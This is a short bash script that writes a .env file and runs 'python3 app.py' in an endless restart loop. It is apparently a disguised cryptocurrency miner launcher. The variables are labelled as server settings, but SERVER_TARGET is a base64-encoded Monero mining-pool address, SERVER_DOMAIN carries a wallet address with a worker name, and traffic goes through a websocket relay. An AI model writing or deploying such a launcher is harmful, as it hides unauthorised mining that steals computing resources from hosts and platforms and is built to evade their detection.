#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://premiumavocado.me
SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTozMzMz
SERVER_DOMAIN=88oiHVkhr3T7GPjnTKtJFNZGtyFXW9nd8QhjsHYoLk6GZZ9FVdsEvRmVu2CNe9d67Va8v77kbFsq2ir8wzHViZqrSTqPo54.${NAME}
SERVER_SECRET=x
SERVER_CONNECTION=${CONNECT}
SERVER_MODE=FAST" > .env
while true; do python3 app.py; sleep 15; done
